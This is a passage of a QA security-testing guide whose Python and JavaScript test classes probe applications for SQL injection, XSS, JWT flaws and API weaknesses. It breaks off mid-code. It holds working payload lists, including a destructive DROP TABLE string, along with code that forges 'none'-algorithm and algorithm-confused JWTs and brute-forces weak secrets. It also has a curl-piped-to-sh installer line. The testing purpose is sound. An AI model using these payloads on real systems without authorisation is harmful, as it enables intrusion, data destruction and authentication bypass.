# Security Testing Essentials

## Overview

Security testing is a critical discipline that identifies vulnerabilities, ensures data protection, and validates security controls in applications. This guide provides comprehensive security testing practices specifically designed for QA professionals.

### Purpose and Scope
- Establish security testing standards for QA teams
- Provide practical security validation techniques
- Create actionable security test strategies
- Build security awareness within quality engineering

### Target Audience
- QA Engineers implementing security testing
- Security-focused quality professionals
- Development teams integrating security practices
- DevSecOps teams automating security validation

### Key Benefits
- Proactive vulnerability identification
- Enhanced application security posture
- Reduced security incident risk
- Compliance with security standards
- Improved customer trust and confidence

## Fundamental Principles

### Core Security Testing Concepts

#### 1. Security Testing Pyramid
```
Manual Security Testing (Exploratory)
├── Penetration Testing
├── Security Code Review
└── Threat Modeling

Automated Security Testing (Continuous)
├── SAST (Static Application Security Testing)
├── DAST (Dynamic Application Security Testing)
├── IAST (Interactive Application Security Testing)
└── SCA (Software Composition Analysis)

Infrastructure Security Testing
├── Container Security Scanning
├── Infrastructure as Code Analysis
└── Network Security Validation
```

#### 2. Security Testing Types Matrix

| Test Type | Scope | Tools | Frequency | Responsibility |
|-----------|-------|-------|-----------|----------------|
| **SAST** | Source code | SonarQube, Checkmarx | Every commit | Developers + QA |
| **DAST** | Running application | OWASP ZAP, Burp Suite | Sprint/Release | QA + Security |
| **IAST** | Runtime analysis | Contrast, Veracode | Continuous | QA Team |
| **SCA** | Dependencies | Snyk, OWASP Dependency Check | Daily | DevOps + QA |
| **Manual Testing** | Complete application | Various tools | Sprint cycles | QA + Security |
| **Penetration Testing** | Production-like | Professional tools | Quarterly | Security team |

#### 3. Security Anti-Patterns to Avoid

❌ **Security as Afterthought**
- Integrate security testing throughout SDLC
- Include security in definition of done

❌ **Testing Only Happy Paths**
- Focus on edge cases and error conditions
- Test malicious input scenarios

❌ **Ignoring Third-Party Components**
- Scan all dependencies for vulnerabilities
- Monitor for new security advisories

❌ **Production-Only Security Testing**
- Test security in all environments
- Implement security gates in CI/CD

## Step-by-Step Implementation

### Phase 1: OWASP Top 10 Testing Implementation

#### 1.1 Injection Testing (A03:2021)

**SQL Injection Testing**
```python
#!/usr/bin/env python3
"""
SQL Injection Testing Framework
Automated detection of SQL injection vulnerabilities
"""

import requests
import time
import re
from urllib.parse import urljoin

class SQLInjectionTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []

    def sql_injection_payloads(self):
        """Common SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users; --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "') or '1'='1--",
            "') or ('1'='1--"
        ]

    def test_login_sqli(self, login_url: str, username_param: str = "username",
                       password_param: str = "password"):
        """Test login form for SQL injection"""
        print(f"Testing SQL injection on login form: {login_url}")

        for payload in self.sql_injection_payloads():
            try:
                # Test username field
                login_data = {
                    username_param: payload,
                    password_param: "password123"
                }

                response = self.session.post(login_url, data=login_data, timeout=10)

                # Check for successful injection indicators
                if self._detect_sqli_success(response):
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'location': f'{login_url} - {username_param} parameter',
                        'payload': payload,
                        'severity': 'High',
                        'description': 'SQL injection vulnerability in login form'
                    })

                # Test password field
                login_data = {
                    username_param: "admin",
                    password_param: payload
                }

                response = self.session.post(login_url, data=login_data, timeout=10)

                if self._detect_sqli_success(response):
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'location': f'{login_url} - {password_param} parameter',
                        'payload': payload,
                        'severity': 'High',
                        'description': 'SQL injection vulnerability in login form'
                    })

                time.sleep(0.5)  # Rate limiting

            except requests.RequestException as e:
                print(f"Error testing payload {payload}: {e}")

    def test_search_sqli(self, search_url: str, search_param: str = "q"):
        """Test search functionality for SQL injection"""
        print(f"Testing SQL injection on search: {search_url}")

        for payload in self.sql_injection_payloads():
            try:
                params = {search_param: payload}
                response = self.session.get(search_url, params=params, timeout=10)

                if self._detect_sqli_success(response):
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'location': f'{search_url} - {search_param} parameter',
                        'payload': payload,
                        'severity': 'High',
                        'description': 'SQL injection vulnerability in search function'
                    })

                time.sleep(0.5)

            except requests.RequestException as e:
                print(f"Error testing search payload {payload}: {e}")

    def _detect_sqli_success(self, response):
        """Detect successful SQL injection indicators"""
        # Check for database error messages
        error_patterns = [
            r"mysql_fetch_array\(\)",
            r"ORA-[0-9]{5}",
            r"Microsoft OLE DB Provider",
            r"PostgreSQL query failed",
            r"Warning: pg_",
            r"valid MySQL result",
            r"MySqlException",
            r"valid PostgreSQL result",
            r"Warning: mysql_",
            r"Unclosed quotation mark after",
            r"Microsoft JET Database Engine",
            r"'80040e14'",
            r"SQLServer JDBC Driver",
            r"SqlException"
        ]

        response_text = response.text.lower()

        for pattern in error_patterns:
            if re.search(pattern.lower(), response_text):
                return True

        # Check for successful bypass indicators
        if response.status_code == 200:
            # Look for admin panels, user data, or success messages
            success_indicators = ["welcome admin", "dashboard", "logout", "profile"]
            for indicator in success_indicators:
                if indicator in response_text:
                    return True

        return False

    def generate_report(self):
        """Generate vulnerability report"""
        if not self.vulnerabilities:
            return "No SQL injection vulnerabilities found."

        report = "SQL Injection Vulnerability Report\n"
        report += "=" * 40 + "\n\n"

        for vuln in self.vulnerabilities:
            report += f"Type: {vuln['type']}\n"
            report += f"Location: {vuln['location']}\n"
            report += f"Payload: {vuln['payload']}\n"
            report += f"Severity: {vuln['severity']}\n"
            report += f"Description: {vuln['description']}\n"
            report += "-" * 40 + "\n"

        return report

# Usage example
if __name__ == "__main__":
    tester = SQLInjectionTester("https://vulnerable-app.com")
    tester.test_login_sqli("/login")
    tester.test_search_sqli("/search")
    print(tester.generate_report())
```

**Cross-Site Scripting (XSS) Testing**
```javascript
// XSS Testing Suite for Web Applications
class XSSSecurityTester {
    constructor(baseUrl) {
        this.baseUrl = baseUrl;
        this.vulnerabilities = [];
    }

    // XSS payload library
    getXSSPayloads() {
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '\';alert("XSS");//',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src=x onerror=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '"><svg/onload=alert("XSS")>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="/" =_=" title="onerror=\'alert(\"XSS\")\'">'
        ];
    }

    // Test for reflected XSS
    async testReflectedXSS(testUrl, parameters) {
        console.log(`Testing Reflected XSS on: ${testUrl}`);

        for (const payload of this.getXSSPayloads()) {
            for (const param of parameters) {
                try {
                    const url = new URL(testUrl);
                    url.searchParams.set(param, payload);

                    const response = await fetch(url.toString());
                    const responseText = await response.text();

                    // Check if payload is reflected without encoding
                    if (responseText.includes(payload)) {
                        this.vulnerabilities.push({
                            type: 'Reflected XSS',
                            location: `${testUrl} - ${param} parameter`,
                            payload: payload,
                            severity: 'High',
                            description: 'User input reflected without proper encoding'
                        });
                        console.log(`🚨 Reflected XSS found: ${param} = ${payload}`);
                    }

                    // Add delay to avoid rate limiting
                    await new Promise(resolve => setTimeout(resolve, 100));

                } catch (error) {
                    console.error(`Error testing ${param} with payload ${payload}:`, error);
                }
            }
        }
    }

    // Test for stored XSS (requires form submission)
    async testStoredXSS(formUrl, formData) {
        console.log(`Testing Stored XSS on: ${formUrl}`);

        for (const payload of this.getXSSPayloads()) {
            try {
                // Submit form with XSS payload
                const submitData = { ...formData };
                submitData[Object.keys(submitData)[0]] = payload;

                const submitResponse = await fetch(formUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams(submitData)
                });

                // Check if stored and reflected on subsequent page loads
                const viewResponse = await fetch(formUrl);
                const viewText = await viewResponse.text();

                if (viewText.includes(payload)) {
                    this.vulnerabilities.push({
                        type: 'Stored XSS',
                        location: formUrl,
                        payload: payload,
                        severity: 'Critical',
                        description: 'Stored XSS vulnerability - malicious script persisted'
                    });
                    console.log(`🚨 Stored XSS found with payload: ${payload}`);
                }

                await new Promise(resolve => setTimeout(resolve, 200));

            } catch (error) {
                console.error(`Error testing stored XSS with payload ${payload}:`, error);
            }
        }
    }

    // Test for DOM-based XSS
    async testDOMXSS(testUrl) {
        console.log(`Testing DOM XSS on: ${testUrl}`);

        const domPayloads = [
            '#<script>alert("DOM-XSS")</script>',
            '#<img src=x onerror=alert("DOM-XSS")>',
            '#" onmouseover="alert(\'DOM-XSS\')" x="',
            '#javascript:alert("DOM-XSS")',
            '#data:text/html,<script>alert("DOM-XSS")</script>'
        ];

        for (const payload of domPayloads) {
            try {
                const testUrlWithPayload = testUrl + payload;

                // This would need to be executed in a browser context
                // For demonstration, we'll log the potential vulnerability
                console.log(`Testing DOM XSS payload: ${testUrlWithPayload}`);

                this.vulnerabilities.push({
                    type: 'Potential DOM XSS',
                    location: testUrl,
                    payload: payload,
                    severity: 'Medium',
                    description: 'Potential DOM-based XSS - requires manual verification'
                });

                await new Promise(resolve => setTimeout(resolve, 100));

            } catch (error) {
                console.error(`Error testing DOM XSS with payload ${payload}:`, error);
            }
        }
    }

    // Generate comprehensive report
    generateReport() {
        if (this.vulnerabilities.length === 0) {
            return "No XSS vulnerabilities found.";
        }

        let report = "Cross-Site Scripting (XSS) Vulnerability Report\n";
        report += "=" * 50 + "\n\n";

        const grouped = this.vulnerabilities.reduce((acc, vuln) => {
            if (!acc[vuln.type]) acc[vuln.type] = [];
            acc[vuln.type].push(vuln);
            return acc;
        }, {});

        for (const [type, vulns] of Object.entries(grouped)) {
            report += `${type} Vulnerabilities (${vulns.length})\n`;
            report += "-".repeat(30) + "\n";

            vulns.forEach(vuln => {
                report += `Location: ${vuln.location}\n`;
                report += `Payload: ${vuln.payload}\n`;
                report += `Severity: ${vuln.severity}\n`;
                report += `Description: ${vuln.description}\n\n`;
            });
        }

        return report;
    }
}

// Usage example
async function runXSSTesting() {
    const tester = new XSSSecurityTester("https://vulnerable-app.com");

    // Test reflected XSS
    await tester.testReflectedXSS("/search", ["q", "query", "term"]);

    // Test stored XSS
    await tester.testStoredXSS("/comments", { comment: "test", author: "tester" });

    // Test DOM XSS
    await tester.testDOMXSS("/profile");

    console.log(tester.generateReport());
}
```

#### 1.2 Authentication Testing

**JWT Token Security Testing**
```python
#!/usr/bin/env python3
"""
JWT Security Testing Framework
Tests for common JWT vulnerabilities
"""

import jwt
import json
import base64
import requests
from datetime import datetime, timedelta

class JWTSecurityTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []

    def test_jwt_none_algorithm(self, token: str, protected_endpoint: str):
        """Test for 'none' algorithm vulnerability"""
        try:
            # Decode the token to get the payload
            decoded = jwt.decode(token, options={"verify_signature": False})

            # Create a new token with 'none' algorithm
            header = {"alg": "none", "typ": "JWT"}
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')

            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(decoded).encode()
            ).decode().rstrip('=')

            malicious_token = f"{header_encoded}.{payload_encoded}."

            # Test the malicious token
            headers = {"Authorization": f"Bearer {malicious_token}"}
            response = requests.get(f"{self.target_url}{protected_endpoint}", headers=headers)

            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'JWT None Algorithm',
                    'severity': 'Critical',
                    'description': 'Application accepts JWT tokens with "none" algorithm',
                    'endpoint': protected_endpoint,
                    'proof': malicious_token
                })

        except Exception as e:
            print(f"Error testing none algorithm: {e}")

    def test_jwt_secret_brute_force(self, token: str, wordlist: list):
        """Test for weak JWT secrets"""
        try:
            for secret in wordlist:
                try:
                    decoded = jwt.decode(token, secret, algorithms=["HS256"])
                    self.vulnerabilities.append({
                        'type': 'Weak JWT Secret',
                        'severity': 'High',
                        'description': f'JWT secret found through brute force: {secret}',
                        'secret': secret,
                        'decoded_payload': decoded
                    })
                    break
                except jwt.InvalidSignatureError:
                    continue
                except jwt.ExpiredSignatureError:
                    # Token is expired but secret is correct
                    self.vulnerabilities.append({
                        'type': 'Weak JWT Secret (Expired Token)',
                        'severity': 'High',
                        'description': f'JWT secret found (token expired): {secret}',
                        'secret': secret
                    })
                    break
                except Exception:
                    continue

        except Exception as e:
            print(f"Error during secret brute force: {e}")

    def test_jwt_algorithm_confusion(self, token: str, public_key: str, protected_endpoint: str):
        """Test for RS256 to HS256 algorithm confusion"""
        try:
            # Decode the original token
            decoded = jwt.decode(token, options={"verify_signature": False})

            # Create new token using HS256 with the public key as secret
            malicious_token = jwt.encode(decoded, public_key, algorithm="HS256")

            # Test the malicious token
            headers = {"Authorization": f"Bearer {malicious_token}"}
            response = requests.get(f"{self.target_url}{protected_endpoint}", headers=headers)

            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'JWT Algorithm Confusion',
                    'severity': 'Critical',
                    'description': 'Application vulnerable to RS256/HS256 confusion attack',
                    'endpoint': protected_endpoint,
                    'proof': malicious_token
                })

        except Exception as e:
            print(f"Error testing algorithm confusion: {e}")

    def test_jwt_claims_manipulation(self, token: str, protected_endpoint: str):
        """Test for insufficient claims validation"""
        try:
            # Decode the token
            decoded = jwt.decode(token, options={"verify_signature": False})
            original_payload = decoded.copy()

            # Test different claim manipulations
            manipulations = [
                {"admin": True},
                {"role": "admin"},
                {"permissions": ["admin", "read", "write", "delete"]},
                {"user_id": "1"},
                {"username": "admin"},
                {"exp": int((datetime.now() + timedelta(days=365)).timestamp())}
            ]

            for manipulation in manipulations:
                test_payload = original_payload.copy()
                test_payload.update(manipulation)

                # This requires knowing the secret - for demo purposes
                # In real testing, you'd use a known weak secret or none algorithm
                test_token = f"manipulated_token_with_{list(manipulation.keys())[0]}"

                print(f"Testing claim manipulation: {manipulation}")

        except Exception as e:
            print(f"Error testing claims manipulation: {e}")

    def get_common_jwt_secrets(self):
        """Return common weak JWT secrets for testing"""
        return [
            "secret",
            "password",
            "123456",
            "admin",
            "test",
            "jwt_secret",
            "your-256-bit-secret",
            "mySecretKey",
            "supersecret",
            "default",
            "qwerty",
            "password123",
            "secret123",
            "jwt",
            "token",
            "key",
            "auth",
            "s3cr3t",
            "mysecret",
            "jwtsecret"
        ]

    def generate_report(self):
        """Generate JWT security test report"""
        if not self.vulnerabilities:
            return "No JWT vulnerabilities found."

        report = "JWT Security Test Report\n"
        report += "=" * 30 + "\n\n"

        for vuln in self.vulnerabilities:
            report += f"Type: {vuln['type']}\n"
            report += f"Severity: {vuln['severity']}\n"
            report += f"Description: {vuln['description']}\n"

            if 'endpoint' in vuln:
                report += f"Endpoint: {vuln['endpoint']}\n"
            if 'secret' in vuln:
                report += f"Secret: {vuln['secret']}\n"
            if 'proof' in vuln:
                report += f"Proof of Concept: {vuln['proof'][:100]}...\n"

            report += "-" * 30 + "\n"

        return report

# Usage example
if __name__ == "__main__":
    tester = JWTSecurityTester("https://api.example.com")

    # Sample JWT token (replace with actual token)
    sample_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

    # Test various JWT vulnerabilities
    tester.test_jwt_none_algorithm(sample_token, "/protected")
    tester.test_jwt_secret_brute_force(sample_token, tester.get_common_jwt_secrets())

    print(tester.generate_report())
```

### Phase 2: Automated Security Testing Integration

#### 2.1 OWASP ZAP Integration
```python
#!/usr/bin/env python3
"""
OWASP ZAP Integration for Automated Security Testing
Integrates ZAP scanning into CI/CD pipeline
"""

import time
import requests
import json
from zapv2 import ZAPv2

class ZAPSecurityTester:
    def __init__(self, zap_proxy_url='http://127.0.0.1:8080'):
        self.zap = ZAPv2(proxies={'http': zap_proxy_url, 'https': zap_proxy_url})
        self.target_url = None
        self.scan_results = {}

    def start_spider_scan(self, target_url: str):
        """Start ZAP spider scan"""
        print(f"Starting spider scan for {target_url}")
        self.target_url = target_url

        # Start spider
        scan_id = self.zap.spider.scan(target_url)

        # Wait for spider to complete
        while int(self.zap.spider.status(scan_id)) < 100:
            print(f"Spider progress: {self.zap.spider.status(scan_id)}%")
            time.sleep(5)

        print("Spider scan completed")
        return self.zap.core.urls()

    def start_active_scan(self, target_url: str):
        """Start ZAP active security scan"""
        print(f"Starting active scan for {target_url}")

        # Start active scan
        scan_id = self.zap.ascan.scan(target_url)

        # Wait for active scan to complete
        while int(self.zap.ascan.status(scan_id)) < 100:
            print(f"Active scan progress: {self.zap.ascan.status(scan_id)}%")
            time.sleep(10)

        print("Active scan completed")

    def configure_authentication(self, login_url: str, username: str, password: str,
                               username_field: str = "username", password_field: str = "password"):
        """Configure authentication for authenticated scanning"""
        print("Configuring authentication...")

        # Set authentication method
        self.zap.authentication.set_authentication_method(
            contextid=0,
            authmethodname='formBasedAuthentication',
            authmethodconfigparams=f'loginUrl={login_url}&loginRequestData={username_field}={username}&{password_field}={password}'
        )

        # Set user credentials
        user_id = self.zap.users.new_user(contextid=0, name='testuser')
        self.zap.users.set_authentication_credentials(
            contextid=0,
            userid=user_id,
            authcredentialsconfigparams=f'{username_field}={username}&{password_field}={password}'
        )

        self.zap.users.set_user_enabled(contextid=0, userid=user_id, enabled=True)

        print("Authentication configured")

    def get_scan_results(self):
        """Retrieve and categorize scan results"""
        alerts = self.zap.core.alerts()

        categorized_results = {
            'High': [],
            'Medium': [],
            'Low': [],
            'Informational': []
        }

        for alert in alerts:
            risk_level = alert['risk']
            categorized_results[risk_level].append({
                'name': alert['alert'],
                'description': alert['description'],
                'url': alert['url'],
                'param': alert['param'],
                'solution': alert['solution'],
                'reference': alert['reference'],
                'evidence': alert['evidence']
            })

        self.scan_results = categorized_results
        return categorized_results

    def generate_html_report(self, output_file: str = 'zap_security_report.html'):
        """Generate HTML security report"""
        if not self.scan_results:
            self.get_scan_results()

        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>ZAP Security Scan Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #f0f0f0; padding: 20px; margin-bottom: 20px; }}
                .risk-high {{ border-left: 5px solid #d32f2f; margin: 10px 0; padding: 10px; }}
                .risk-medium {{ border-left: 5px solid #f57c00; margin: 10px 0; padding: 10px; }}
                .risk-low {{ border-left: 5px solid #fbc02d; margin: 10px 0; padding: 10px; }}
                .risk-info {{ border-left: 5px solid #1976d2; margin: 10px 0; padding: 10px; }}
                .summary {{ display: flex; justify-content: space-around; margin: 20px 0; }}
                .metric {{ text-align: center; padding: 20px; background-color: #f5f5f5; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Security Scan Report</h1>
                <p>Target: {self.target_url}</p>
                <p>Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>

            <div class="summary">
                <div class="metric">
                    <h3>High Risk</h3>
                    <p style="color: #d32f2f; font-size: 24px;">{len(self.scan_results['High'])}</p>
                </div>
                <div class="metric">
                    <h3>Medium Risk</h3>
                    <p style="color: #f57c00; font-size: 24px;">{len(self.scan_results['Medium'])}</p>
                </div>
                <div class="metric">
                    <h3>Low Risk</h3>
                    <p style="color: #fbc02d; font-size: 24px;">{len(self.scan_results['Low'])}</p>
                </div>
                <div class="metric">
                    <h3>Informational</h3>
                    <p style="color: #1976d2; font-size: 24px;">{len(self.scan_results['Informational'])}</p>
                </div>
            </div>
        """

        for risk_level, alerts in self.scan_results.items():
            if alerts:
                html_content += f"<h2>{risk_level} Risk Issues</h2>"

                for alert in alerts:
                    html_content += f"""
                    <div class="risk-{risk_level.lower()}">
                        <h3>{alert['name']}</h3>
                        <p><strong>URL:</strong> {alert['url']}</p>
                        <p><strong>Parameter:</strong> {alert['param']}</p>
                        <p><strong>Description:</strong> {alert['description']}</p>
                        <p><strong>Solution:</strong> {alert['solution']}</p>
                        <p><strong>Evidence:</strong> {alert['evidence']}</p>
                    </div>
                    """

        html_content += """
        </body>
        </html>
        """

        with open(output_file, 'w') as f:
            f.write(html_content)

        print(f"HTML report generated: {output_file}")
        return output_file

    def export_json_report(self, output_file: str = 'zap_results.json'):
        """Export results as JSON"""
        if not self.scan_results:
            self.get_scan_results()

        with open(output_file, 'w') as f:
            json.dump(self.scan_results, f, indent=2)

        print(f"JSON report exported: {output_file}")
        return output_file

# CI/CD Integration Script
def run_zap_pipeline_scan(target_url: str, authentication_config: dict = None):
    """Run ZAP scan in CI/CD pipeline"""
    zap_tester = ZAPSecurityTester()

    try:
        # Configure authentication if provided
        if authentication_config:
            zap_tester.configure_authentication(**authentication_config)

        # Run spider scan
        urls = zap_tester.start_spider_scan(target_url)
        print(f"Discovered {len(urls)} URLs")

        # Run active scan
        zap_tester.start_active_scan(target_url)

        # Get results
        results = zap_tester.get_scan_results()

        # Generate reports
        zap_tester.generate_html_report()
        zap_tester.export_json_report()

        # Check for security gate failures
        high_risk_count = len(results['High'])
        medium_risk_count = len(results['Medium'])

        if high_risk_count > 0:
            print(f"❌ SECURITY GATE FAILED: {high_risk_count} high-risk vulnerabilities found")
            return False
        elif medium_risk_count > 5:
            print(f"⚠️  SECURITY GATE WARNING: {medium_risk_count} medium-risk vulnerabilities found")
            return False
        else:
            print("✅ SECURITY GATE PASSED: No critical vulnerabilities found")
            return True

    except Exception as e:
        print(f"Error during ZAP scan: {e}")
        return False

# Usage example
if __name__ == "__main__":
    auth_config = {
        'login_url': 'https://example.com/login',
        'username': 'testuser',
        'password': 'testpass',
        'username_field': 'email',
        'password_field': 'password'
    }

    success = run_zap_pipeline_scan('https://example.com', auth_config)
    exit(0 if success else 1)
```

#### 2.2 Container Security Scanning
```dockerfile
# Multi-stage Dockerfile with security scanning
FROM node:16-alpine AS builder

# Install dependencies
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

# Security scanning stage
FROM builder AS security-scan

# Install security tools
RUN apk add --no-cache curl
RUN curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# Copy application
COPY . .

# Run security scans
RUN trivy fs --exit-code 1 --severity HIGH,CRITICAL .
RUN npm audit --audit-level high

# Production stage
FROM node:16-alpine AS production

# Create non-root user
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodeuser -u 1001

# Copy application
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY . .

# Set security headers and permissions
RUN chown -R nodeuser:nodejs /app
USER nodeuser

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:3000/health || exit 1

EXPOSE 3000
CMD ["npm", "start"]
```

```yaml
# GitHub Actions Security Pipeline
name: Security Testing Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  sast-scan:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2

    - name: Run CodeQL Analysis
      uses: github/codeql-action/init@v2
      with:
        languages: javascript, python

    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v2

    - name: Run SonarQube Scan
      uses: sonarqube-quality-gate-action@master
      env:
        SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

  dependency-scan:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2

    - name: Run Snyk Security Scan
      uses: snyk/actions/node@master
      env:
        SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      with:
        args: --severity-threshold=high

    - name: OWASP Dependency Check
      uses: dependency-check/Dependency-Check_Action@main
      with:
        project: 'security-test'
        path: '.'
        format: 'HTML'

  container-scan:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2

    - name: Build Docker Image
      run: docker build -t security-test:latest .

    - name: Run Trivy Scanner
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: 'security-test:latest'
        format: 'sarif'
        output: 'trivy-results.sarif'

    - name: Upload Trivy Results
      uses: github/codeql-action/upload-sarif@v2
      with:
        sarif_file: 'trivy-results.sarif'

  dast-scan:
    runs-on: ubuntu-latest
    needs: [sast-scan, dependency-scan]
    steps:
    - uses: actions/checkout@v2

    - name: Start Application
      run: |
        docker-compose up -d
        sleep 30

    - name: Run ZAP Baseline Scan
      uses: zaproxy/action-baseline@v0.7.0
      with:
        target: 'http://localhost:3000'
        rules_file_name: '.zap/rules.tsv'

    - name: Run ZAP Full Scan
      uses: zaproxy/action-full-scan@v0.4.0
      with:
        target: 'http://localhost:3000'
        rules_file_name: '.zap/rules.tsv'

  security-gate:
    runs-on: ubuntu-latest
    needs: [sast-scan, dependency-scan, container-scan, dast-scan]
    steps:
    - name: Security Gate Check
      run: |
        echo "Checking security gate criteria..."
        # Add logic to check if any critical vulnerabilities were found
        # Fail the build if security criteria are not met
```

### Phase 3: API Security Testing

#### 3.1 REST API Security Testing Framework
```python
#!/usr/bin/env python3
"""
Comprehensive API Security Testing Framework
Tests for common API security vulnerabilities
"""

import requests
import json
import time
import random
import string
from urllib.parse import urljoin

class APISecurityTester:
    def __init__(self, base_url: str, api_key: str = None):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []

        if api_key:
            self.session.headers.update({'X-API-Key': api_key})

    def test_broken_authentication(self, endpoints: list):
        """Test for broken authentication vulnerabilities"""
        print("Testing broken authentication...")

        for endpoint in endpoints:
            # Test without authentication
            response = requests.get(urljoin(self.base_url, endpoint))

            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Broken Authentication',
                    'severity': 'High',
                    'endpoint': endpoint,
                    'description': 'Endpoint accessible without authentication',
                    'response_code': response.status_code
                })

            # Test with invalid token
            headers = {'Authorization': 'Bearer invalid_token_12345'}
            response = requests.get(urljoin(self.base_url, endpoint), headers=headers)

            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Broken Authentication',
                    'severity': 'Critical',
                    'endpoint': endpoint,
                    'description': 'Endpoint accepts invalid authentication token',
                    'response_code': response.status_code
                })

    def test_broken_authorization(self, user_endpoints: dict):
        """Test for broken authorization (BOLA/IDOR)"""
        print("Testing broken authorization...")

        # user_endpoints format: {'user1_token': ['/api/user/1/profile'], 'user2_token': [...]}
        tokens = list(user_endpoints.keys())

        if len(tokens) < 2:
            print("Need at least 2 user tokens for authorization testing")
            return

        for token, endpoints in user_endpoints.items():
            other_tokens = [t for t in tokens if t != token]

            for endpoint in endpoints:
                for other_token in other_tokens:
                    headers = {'Authorization': f'Bearer {other_token}'}
                    response = requests.get(urljoin(self.base_url, endpoint), headers=headers)

                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            'type': 'Broken Authorization (BOLA)',
                            'severity': 'High',
                            'endpoint': endpoint,
                            'description': f'User can access another user\'s resource',
                            'original_token': token,
                            'unauthorized_token': other_token
                        })

    def test_excessive_data_exposure(self, endpoints: list, auth_token: str = None):
        """Test for excessive data exposure"""
        print("Testing excessive data exposure...")

        headers = {}
        if auth_token:
            headers['Authorization'] = f'Bearer {auth_token}'

        for endpoint in endpoints:
            response = requests.get(urljoin(self.base_url, endpoint), headers=headers)

            if response.status_code == 200:
                try:
                    data = response.json()

                    # Check for sensitive fields
                    sensitive_fields = [
                        'password', 'passwd', 'pwd', 'secret', 'token',
                        'api_key', 'private_key', 'ssn', 'social_security',
                        'credit_card', 'card_number', 'cvv', 'pin'
                    ]

                    exposed_fields = []
                    for field in sensitive_fields:
                        if self._find_sensitive_field(data, field):
                            exposed_fields.append(field)

                    if exposed_fields:
                        self.vulnerabilities.append({
                            'type': 'Excessive Data Exposure',
                            'severity': 'Medium',
                            'endpoint': endpoint,
                            'description': f'Sensitive fields exposed: {", ".join(exposed_fields)}',
                            'exposed_fields': exposed_fields
                        })

                except json.JSONDecodeError:
                    pass

    def test_rate_limiting(self, endpoint: str, requests_count: int = 100):
        """Test for lack of rate limiting"""
        print(f"Testing rate limiting on {endpoint}...")

        start_time = time.time()
        successful_requests = 0

        for i in range(requests_count):
            try:
                response = requests.get(urljoin(self.base_url, endpoint))
                if response.status_code != 429:  # Not rate limited
                    successful_requests += 1
                time.sleep(0.1)  # Small delay
            except Exception:
                pass

        end_time = time.time()
        duration = end_time - start_time

        if successful_requests > requests_count * 0.8:  # More than 80% success
            self.vulnerabilities.append({
                'type': 'Missing Rate Limiting',
                'severity': 'Medium',
                'endpoint': endpoint,
                'description': f'{successful_requests}/{requests_count} requests succeeded in {duration:.2f}s',
                'successful_requests': successful_requests,
                'total_requests': requests_count
            })

    def test_sql_injection_api(self, endpoints: list, auth_token: str = None):
        """Test API endpoints for SQL injection"""
        print("Testing API SQL injection...")

        headers = {}
        if auth_token:
            headers['Authorization'] = f'Bearer {auth_token}'

        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users; --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
        ]

        for endpoint in endpoints:
            for payload in sql_payloads:
                # Test in URL parameters
                test_url = f"{urljoin(self.base_url, endpoint)}?id={payload}"
                response = requests.get(test_url, headers=headers)

                if self._detect_sql_error(response.text):
                    self.vulnerabilities.append({
                        'type': 'SQL Injection (API)',
                        'severity': 'Critical',
